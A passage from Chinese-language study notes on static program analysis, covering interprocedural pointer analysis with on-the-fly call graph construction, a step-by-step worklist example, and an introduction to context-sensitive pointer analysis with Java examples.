          <a href="#4-Pointer-Analysis-with-Method-Calls" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-Pointer-Analysis-with-Method-Calls" class="headerlink" title="4.Pointer Analysis with Method Calls"></a>4.Pointer Analysis with Method Calls</h2>
      <p>结合之前的<code>CHA</code>和指针分析，来做过程间的指针分析</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116153358145.png" alt="image-20230116153358145"></p>
<p>在指针分析的过程中做<code>call graph</code>，即<code>on-the-fly call graph construction</code>。</p>
<p>指针分析更加准确，在做过程间的分析时就会使得<code>call graph</code>做的更好，因为不用再依据声明的对象来寻找方法，而是直接通过指针指向的对象来获取方法，更加准确。</p>
<p>而<code>call graph</code>做的越好，其虚假边就会更少，从而指针分析就会更加准确。这两者是互相成就。</p>
<p>只会分析可达方法，不可达方法不进行指针分析，提升精度和效率。</p>

        <h3 id="Rule-Call"   >
          <a href="#Rule-Call" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rule-Call" class="headerlink" title="Rule : Call"></a>Rule : Call</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116161005808.png" alt="image-20230116161005808"></p>
<p>符号含义：</p>
<ul>
<li><code>Dispatch(Oi,k) </code> : 和之前一样，通过传入对象指针和函数签名寻找函数，本类找不到找父类</li>
<li><code>M_this</code> : 函数<code>m</code>中的<code>this</code>变量</li>
<li><code>M_pj</code> : 函数<code>m</code>中的第<code>j</code>个参数</li>
<li><code>M_ret</code> : 函数<code>M</code>的返回值</li>
</ul>
<p>即相关的传递指针<br>$$<br>\begin{align}<br>&amp;O_i\in pt(x),m=Dispatch(O_i,k)\ &amp;=&gt;&amp;\ O_i\in pt(m_{this})&amp;(传递this指针,不用在PFG连边)\<br>&amp;O_u\in pt(a_j),1\leqslant j\leqslant n\ &amp;=&gt;&amp;\ O_u\in pt(m_{pj}),1\leqslant j\leqslant n&amp;(传递参数指针,需要在PFG连边)\<br>&amp;O_v\in pt(m_{ret}) &amp;=&gt;&amp;\ O_v\in pt(r)&amp;(传递ret指针,需要在PFG连边)\<br>\end{align}<br>$$<br>需要注意的是<code>this</code>传递的时候是不用在<code>PFG</code>中进行连边处理的，因为如果连边处理的话，那么<code>pt(x)</code>包含的所有对象都会流入到不同的类中，情形如下，就会多出无效的对象要处理，浪费资源。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116175017004.png" alt="image-20230116175017004"></p>

        <h3 id="Algorithms"   >
          <a href="#Algorithms" class="heading-link"><i class="fas fa-link"></i></a><a href="#Algorithms" class="headerlink" title="Algorithms"></a>Algorithms</h3>
      <p>相关算法</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116182119855.png" alt="image-20230116182119855"></p>
<p>相关概念已经解释很清楚了</p>

        <h4 id="AddReachable-𝑚"   >
          <a href="#AddReachable-𝑚" class="heading-link"><i class="fas fa-link"></i></a><a href="#AddReachable-𝑚" class="headerlink" title="AddReachable(𝑚)"></a>AddReachable(𝑚)</h4>
      <p>程序最开始、以及新的<code>call graph</code>边被添加时都会调用到，该方法的功能其实就是对于一个方法中所有可达语句进行相关的初始化。</p>
<p>可以看到最开始进入的方法是<code>m^entry</code>，借助是否发现新方法来对<code>WL</code>以及<code>PFG</code>进行更新。</p>
<p>对于最开始调用，即<code>m^entry</code>作为新方法传入时。和之前差不多，只是添加了一些关于是否可达的语句进来，用来进行<code>New</code>和<code>Assign</code>相关对象指针初始化、<code>WL</code>和<code>RM</code>的初始化、以及<code>PFG</code>的初始化。</p>
<p>而对于后续发现新方法，都是进行针对新方法的一些指针分析初始化，类似的。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116182315115.png" alt="image-20230116182315115"></p>
<p>注：新方法的初始化是不能对<code>Load</code>和<code>Store</code>以及<code>Call</code>进行处理的，因为这些都需要依赖于<code>New</code>和<code>Assign</code>。</p>

        <h4 id="ProcessCall-𝑥-O𝑖"   >
          <a href="#ProcessCall-𝑥-O𝑖" class="heading-link"><i class="fas fa-link"></i></a><a href="#ProcessCall-𝑥-O𝑖" class="headerlink" title="ProcessCall(𝑥, O𝑖)"></a>ProcessCall(𝑥, O𝑖)</h4>
      <p>上述初始化之后的后续部分都差不多，只是在大循环中多了一个<code>ProcessCall</code>进行新方法的发现添加。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227111848832.png" alt="image-20230227111848832"></p>
<p>针对某个变量的<code>WL</code>的处理，都需要对所有可<code>reachable</code>的函数进行处理传递</p>

        <h4 id="Output"   >
          <a href="#Output" class="heading-link"><i class="fas fa-link"></i></a><a href="#Output" class="headerlink" title="Output"></a>Output</h4>
      <p>得到相关的指针集<code>(Points-to Relations (pt))</code>以及调用图<code>(Call Graph)</code></p>

        <h4 id="实例-3"   >
          <a href="#实例-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#实例-3" class="headerlink" title="实例"></a>实例</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227144343229.png" alt="image-20230227144343229"></p>

        <h5 id="初始化"   >
          <a href="#初始化" class="heading-link"><i class="fas fa-link"></i></a><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h5>
      <p>首先是初始化，经过<code>AddReachable(m_entry)</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227144513373.png" alt="image-20230227144513373"></p>
<p>得到如下结果</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RM = &#123;A.main()&#125;</span><br><span class="line">WL = [&lt;a,&#123;O3&#125;&gt;,&lt;b,&#123;O4&#125;&gt;]</span><br><span class="line">由于没有x=y之类的语句,没有调用到AddEdge</span><br><span class="line">CG = &#123;&#125;</span><br><span class="line">PFG = &#123;&#125;</span><br></pre></td></tr></table></div></figure>


        <h5 id="WL处理-1"   >
          <a href="#WL处理-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#WL处理-1" class="headerlink" title="WL处理"></a>WL处理</h5>
      
        <h6 id="第一次迭代-4"   >
          <a href="#第一次迭代-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#第一次迭代-4" class="headerlink" title="第一次迭代"></a>第一次迭代</h6>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Processing = &lt;a,&#123;O3&#125;&gt;;</span><br><span class="line">WL = [&lt;b,&#123;O4&#125;&gt;];</span><br><span class="line">RM = &#123;A.main()&#125;;</span><br><span class="line">CG = &#123;&#125;;</span><br><span class="line">PFG = &#123;&#125;;</span><br><span class="line">n = a;</span><br><span class="line">pts = &#123;O3&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O3&#125; - &#123;&#125; = &#123;O3&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O3&#125;;</span><br><span class="line">	pt(a) = pt(n) = pts ⋃ pt(n) = &#123;O3&#125; ⋃ &#123;&#125; = &#123;O3&#125;;</span><br><span class="line">	PFG = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">关于a的成员没有相关Load和Store以及call操作，循环结束</span><br></pre></td></tr></table></div></figure>

<p>结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227145905255.png" alt="image-20230227145905255"></p>

        <h6 id="第二次迭代-4"   >
          <a href="#第二次迭代-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#第二次迭代-4" class="headerlink" title="第二次迭代"></a>第二次迭代</h6>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Processing = &lt;b,&#123;O4&#125;&gt;;</span><br><span class="line">WL = [];</span><br><span class="line">RM = &#123;A.main()&#125;;</span><br><span class="line">CG = &#123;&#125;;</span><br><span class="line">PFG = &#123;...&#125;;</span><br><span class="line">n = b;</span><br><span class="line">pts = &#123;O4&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O4&#125; - &#123;&#125; = &#123;O4&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O4&#125;;</span><br><span class="line">	pt(b) = pt(n) = pts ⋃ pt(n) = &#123;O4&#125; ⋃ &#123;&#125; = &#123;O4&#125;;</span><br><span class="line">	PFG没有关于b-&gt;x的流向</span><br><span class="line"></span><br><span class="line">关于a的成员没有相关Load和Store</span><br><span class="line"></span><br><span class="line">ProcessCall(x,Oi):</span><br><span class="line">	m = B.foo(A);</span><br><span class="line">	WL += &lt;B.foo/this,&#123;O4&#125;&gt;;</span><br><span class="line">	CG += &#123;5-&gt;B.foo(A)&#125;;</span><br><span class="line">	AddReachable(m):</span><br><span class="line">		RM += &#123;B.foo(A)&#125;;</span><br><span class="line">		WL += &lt;r,O11&gt;;</span><br><span class="line">		没有关于r的Load操作，退出函数</span><br><span class="line">	AddEdge:</span><br><span class="line">		PFG += &#123;a-&gt;y&#125;;</span><br><span class="line">		PFG += &#123;r-&gt;c&#125;;</span><br></pre></td></tr></table></div></figure>

<p>最终结果如下：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227151348799.png" alt="image-20230227151348799"></p>

        <h6 id="第三次迭代-3"   >
          <a href="#第三次迭代-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#第三次迭代-3" class="headerlink" title="第三次迭代"></a>第三次迭代</h6>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Processing = &lt;B.foo/this,&#123;O4&#125;&gt;;</span><br><span class="line">WL = [&lt;r,&#123;O11&#125;&gt;,&lt;y,O3&gt;];</span><br><span class="line">RM = &#123;A.main(),B.foo(A)&#125;;</span><br><span class="line">CG = &#123;5-&gt;B.foo(A)&#125;;</span><br><span class="line">PFG = &#123;...&#125;;</span><br><span class="line">n = B.foo/this;</span><br><span class="line">pts = &#123;O4&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O4&#125; - &#123;&#125; = &#123;O4&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O4&#125;;</span><br><span class="line">	pt(B.foo/this) = pt(n) = pts ⋃ pt(n) = &#123;O4&#125; ⋃ &#123;&#125; = &#123;O4&#125;;</span><br><span class="line">	PFG没有关于B.foo/this-&gt;x的流向</span><br><span class="line"></span><br><span class="line">关于B.foo/this的成员没有相关Load和Store以及call操作，循环结束</span><br></pre></td></tr></table></div></figure>

<p>最终结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227152241402.png" alt="image-20230227152241402"></p>

        <h6 id="第四次迭代-1"   >
          <a href="#第四次迭代-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#第四次迭代-1" class="headerlink" title="第四次迭代"></a>第四次迭代</h6>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Processing = &lt;r,&#123;O11&#125;&gt;;</span><br><span class="line">WL = [&lt;y,O3&gt;];</span><br><span class="line">RM = &#123;A.main(),B.foo(A)&#125;;</span><br><span class="line">CG = &#123;5-&gt;B.foo(A)&#125;;</span><br><span class="line">PFG = &#123;...&#125;;</span><br><span class="line">n = r;</span><br><span class="line">pts = &#123;O11&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O11&#125; - &#123;&#125; = &#123;O11&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O11&#125;;</span><br><span class="line">	pt(r) = pt(n) = pts ⋃ pt(r) = &#123;O11&#125; ⋃ &#123;&#125; = &#123;O11&#125;;</span><br><span class="line">	WL += &lt;c,&#123;O11&#125;&gt;;</span><br><span class="line"></span><br><span class="line">关于c的成员没有相关Load和Store以及call操作，循环结束</span><br></pre></td></tr></table></div></figure>

<p>结果如下:</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227152605132.png" alt="image-20230227152605132"></p>

        <h6 id="第五次迭代-1"   >
          <a href="#第五次迭代-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#第五次迭代-1" class="headerlink" title="第五次迭代"></a>第五次迭代</h6>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Processing = &lt;y,O3&gt;;</span><br><span class="line">WL = [&lt;c,&#123;O11&#125;&gt;];</span><br><span class="line">RM = &#123;A.main(),B.foo(A)&#125;;</span><br><span class="line">CG = &#123;5-&gt;B.foo(A)&#125;;</span><br><span class="line">PFG = &#123;...&#125;;</span><br><span class="line">n = y;</span><br><span class="line">pts = &#123;O3&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O3&#125; - &#123;&#125; = &#123;O3&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O3&#125;;</span><br><span class="line">	pt(y) = pt(n) = pts ⋃ pt(y) = &#123;O3&#125; ⋃ &#123;&#125; = &#123;O3&#125;;</span><br><span class="line">	PFG没有关于y-&gt;x的流向</span><br><span class="line"></span><br><span class="line">关于y的成员没有相关Load和Store以及call操作，循环结束</span><br></pre></td></tr></table></div></figure>

<p>结果如下：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227152843432.png" alt="image-20230227152843432"></p>

        <h6 id="第六次迭代-1"   >
          <a href="#第六次迭代-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#第六次迭代-1" class="headerlink" title="第六次迭代"></a>第六次迭代</h6>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Processing = &lt;c,O11&gt;;</span><br><span class="line">WL = [];</span><br><span class="line">RM = &#123;A.main(),B.foo(A)&#125;;</span><br><span class="line">CG = &#123;5-&gt;B.foo(A)&#125;;</span><br><span class="line">PFG = &#123;...&#125;;</span><br><span class="line">n = c;</span><br><span class="line">pts = &#123;O11&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O11&#125; - &#123;&#125; = &#123;O11&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O11&#125;;</span><br><span class="line">	pt(c) = pt(n) = pts ⋃ pt(c) = &#123;O11&#125; ⋃ &#123;&#125; = &#123;O11&#125;;</span><br><span class="line">	PFG没有关于c-&gt;x的流向</span><br><span class="line"></span><br><span class="line">关于c的成员没有相关Load和Store以及call操作，循环结束</span><br></pre></td></tr></table></div></figure>

<p>结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227153003163.png" alt="image-20230227153003163"></p>
<p>至此整个算法结束，得到最终结果<code>CG</code>和<code>PFG</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227153105750.png" alt="image-20230227153105750"></p>

        <h2 id="总结-4"   >
          <a href="#总结-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结-4" class="headerlink" title="总结"></a>总结</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227154718912.png" alt="image-20230227154718912"></p>
<p>理解对于方法调用的指针分析规则，理解过程间的指针分析算法，以及两者相互依赖的情况。</p>

        <h1 id="十、Pointer-Analysis-Context-Sensitivity-I"   >
          <a href="#十、Pointer-Analysis-Context-Sensitivity-I" class="heading-link"><i class="fas fa-link"></i></a><a href="#十、Pointer-Analysis-Context-Sensitivity-I" class="headerlink" title="十、Pointer Analysis Context Sensitivity (I)"></a>十、Pointer Analysis Context Sensitivity (I)</h1>
      
        <h2 id="Problem-of-Context-Insensitive-Pointer-Analysis"   >
          <a href="#Problem-of-Context-Insensitive-Pointer-Analysis" class="heading-link"><i class="fas fa-link"></i></a><a href="#Problem-of-Context-Insensitive-Pointer-Analysis" class="headerlink" title="Problem of Context-Insensitive  Pointer Analysis"></a>Problem of Context-Insensitive  Pointer Analysis</h2>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Number n1, n2, x, y;</span><br><span class="line">    n1 = <span class="keyword">new</span> One(); <span class="comment">// O1</span></span><br><span class="line">    n2 = <span class="keyword">new</span> Two(); <span class="comment">// O2</span></span><br><span class="line">    x = id(n1);</span><br><span class="line">    y = id(n2);</span><br><span class="line">    <span class="keyword">int</span> i = x.get();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Number <span class="title">id</span><span class="params">(Number n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Number</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">get</span><span class="params">()</span></span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">One</span> <span class="keyword">implements</span> <span class="title">Number</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">get</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="number">1</span>; &#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Two</span> <span class="keyword">implements</span> <span class="title">Number</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">get</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="number">2</span>; &#125;&#125;</span><br></pre></td></tr></table></div></figure>

<ul>
<li><p><code>Context-Insensitive</code>：如果利用之前学到的指针分析进行分析的话，就会导致对于<code>id</code>函数的返回值<code>n</code>，其会包含两个对象，即<code>&#123;O1,O2&#125;</code>。从而导致<code>n-&gt;x,y</code>的流向中，会将<code>&#123;O1,O2&#125;</code>传递给<code>x,y</code>，导致<code>x,y</code>也包含两个对象，如下所示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227161326592.png" alt="image-20230227161326592"></p>
<p>那么在后续的调用中，<code>int i = x.get();</code>这代码进行常量传播分析时，就会导致<code>i = NAC</code>，这是错误的结果，不准确。</p>
</li>
<li><p><code>Context sensitivity</code>：利用上下文敏感进行分析的话，将每一次的函数调用分为不同的情况进行分析，这样就可以得到如下精确的<code>PFG</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227161537640.png" alt="image-20230227161537640"></p>
<p>这样进行常量传播分析时就能得到精确的结果了。</p>
</li>
</ul>

        <h2 id="1-Introduction"   >
          <a href="#1-Introduction" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Introduction" class="headerlink" title="1.Introduction"></a>1.Introduction</h2>
      
        <h3 id="Imprecision-of-Context-Insensitivity-C-I"   >
          <a href="#Imprecision-of-Context-Insensitivity-C-I" class="heading-link"><i class="fas fa-link"></i></a><a href="#Imprecision-of-Context-Insensitivity-C-I" class="headerlink" title="Imprecision of Context Insensitivity (C.I.)"></a>Imprecision of Context Insensitivity (C.I.)</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227162348110.png" alt="image-20230227162348110"></p>
<p>依据之前的例子也可以看出来，一个函数每一次调用时，其上下文，数据流等可能会不同，那么其结果也可能会不同。而不敏感的分析中，这些所有的结果都会混合到一起，即混合到该函数的返回变量中，这样就会导致混合的数据流传播时污染了其他的数据流，导致虚假的一些信息。</p>

        <h3 id="Context-Sensitivity-C-S"   >
          <a href="#Context-Sensitivity-C-S" class="heading-link"><i class="fas fa-link"></i></a><a href="#Context-Sensitivity-C-S" class="headerlink" title="Context Sensitivity (C.S.)"></a>Context Sensitivity (C.S.)</h3>
      
        <h4 id="call-site-sensitivity-call-string"   >
          <a href="#call-site-sensitivity-call-string" class="heading-link"><i class="fas fa-link"></i></a><a href="#call-site-sensitivity-call-string" class="headerlink" title="call-site  sensitivity (call-string)"></a>call-site  sensitivity (call-string)</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227163406069.png" alt="image-20230227163406069"></p>
<p>比较古老以及好理解的一种方法，即某点调用时，它的上下文即为<code>Call Site</code>。比如如下的代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227163018057.png" alt="image-20230227163018057"></p>
<p>对于<code>id</code>方法而言有两个上下文：<code>[1]</code>和<code>[2]</code>，进行调用时就会作克隆标记，方法为<code>Cloning-Based</code>进行分析</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227163523979.png" alt="image-20230227163523979"></p>

        <h3 id="Context-Sensitive-Heap"   >
          <a href="#Context-Sensitive-Heap" class="heading-link"><i class="fas fa-link"></i></a><a href="#Context-Sensitive-Heap" class="headerlink" title="Context-Sensitive Heap"></a>Context-Sensitive Heap</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227165115263.png" alt="image-20230227165115263"></p>
<p>用以提高精度，将创建的对象依据上下文进行更加细粒的区分</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Y y = <span class="keyword">new</span> Y(<span class="number">1</span>);</span><br><span class="line">    X a = newX(y);</span><br><span class="line">    </span><br><span class="line">    y = <span class="keyword">new</span> Y(<span class="number">2</span>);</span><br><span class="line">    X b = newX(y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">X <span class="title">newX</span><span class="params">(Y y)</span> </span>&#123;</span><br><span class="line">    X x = <span class="keyword">new</span> X();</span><br><span class="line">    x.f = y;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>比如上述代码中，如果使用<code>C.I.</code>进行分析，那么无论什么时候调用函数<code>newX</code>，最后都只会得到一个对象<code>O_10</code>。但是如果在<code>C.S.</code>中使用该方法进行细粒化，就可以在不同的调用点对<code>O_10</code>进行区分，比如这里就可以将<code>O_10</code>分为<code>C3:O_10</code>和<code>C6:O_10</code>，类似如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227165502792.png" alt="image-20230227165502792"></p>
<p>这样就精度更高，避免数据流的混合。</p>

        <h4 id="实际例子-1"   >
          <a href="#实际例子-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#实际例子-1" class="headerlink" title="实际例子"></a>实际例子</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227170232579.png" alt="image-20230227170232579"></p>
<p>其实通过上述图片可以大概推导出来，在<code>C.S.heap</code>的技术中，主要是针对传入的上下文做一个标记，标记出不同上下文下得到的对象，这样就可以更加精确。</p>
<p><code>C.S.heap</code>要和<code>C.S.</code>共同使用才能发挥作用，<code>C.S.heap</code>和<code>C.I.</code>是不能发挥作用的，如下例子所示。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227171052291.png" alt="image-20230227171052291"></p>

        <h2 id="2-Context-Sensitive-Pointer-Analysis-Rules"   >
          <a href="#2-Context-Sensitive-Pointer-Analysis-Rules" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Context-Sensitive-Pointer-Analysis-Rules" class="headerlink" title="2.Context Sensitive Pointer Analysis: Rules"></a>2.Context Sensitive Pointer Analysis: Rules</h2>
      
        <h3 id="Domain"   >
          <a href="#Domain" class="heading-link"><i class="fas fa-link"></i></a><a href="#Domain" class="headerlink" title="Domain"></a>Domain</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227171524578.png" alt="image-20230227171524578"></p>
<p>主要加入了一个修饰符<code>c</code>，表示上下文</p>

        <h3 id="Rules"   >
          <a href="#Rules" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rules" class="headerlink" title="Rules"></a>Rules</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227172158603.png" alt="image-20230227172158603"></p>
<p>类似之前的一些规则表格</p>

        <h4 id="Rule-New-1"   >
          <a href="#Rule-New-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rule-New-1" class="headerlink" title="Rule: New"></a>Rule: New</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227172536628.png" alt="image-20230227172536628"></p>
<p>这个就很容易理解了</p>

        <h4 id="Rule-Assign-1"   >
          <a href="#Rule-Assign-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rule-Assign-1" class="headerlink" title="Rule: Assign"></a>Rule: Assign</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227172807051.png" alt="image-20230227172807051"></p>
<p>这个也容易理解</p>

        <h4 id="Rule-Store-1"   >
          <a href="#Rule-Store-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rule-Store-1" class="headerlink" title="Rule: Store"></a>Rule: Store</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227172917941.png" alt="image-20230227172917941"></p>
<p>容易理解，就是理清楚各个变量指向对象的上下文<code>C</code>在哪里</p>

        <h4 id="Rule-Load-1"   >
          <a href="#Rule-Load-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rule-Load-1" class="headerlink" title="Rule: Load"></a>Rule: Load</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227173015546.png" alt="image-20230227173015546"></p>
<p>类似的</p>

        <h4 id="小总结"   >
          <a href="#小总结" class="heading-link"><i class="fas fa-link"></i></a><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227173051279.png" alt="image-20230227173051279"></p>

        <h4 id="Rule-Call-1"   >
          <a href="#Rule-Call-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rule-Call-1" class="headerlink" title="Rule: Call"></a>Rule: Call</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227174623063.png" alt="image-20230227174623063"></p>
<p>当进行方法调用时，<code>Dispatch</code>求解函数，然后<code>Select</code>得到上下文之后，就可以对应进行相关变量的值，或者指针对象传递了。和之前也差不多，就是加入了相关的上下文。</p>

        <h2 id="总结-5"   >
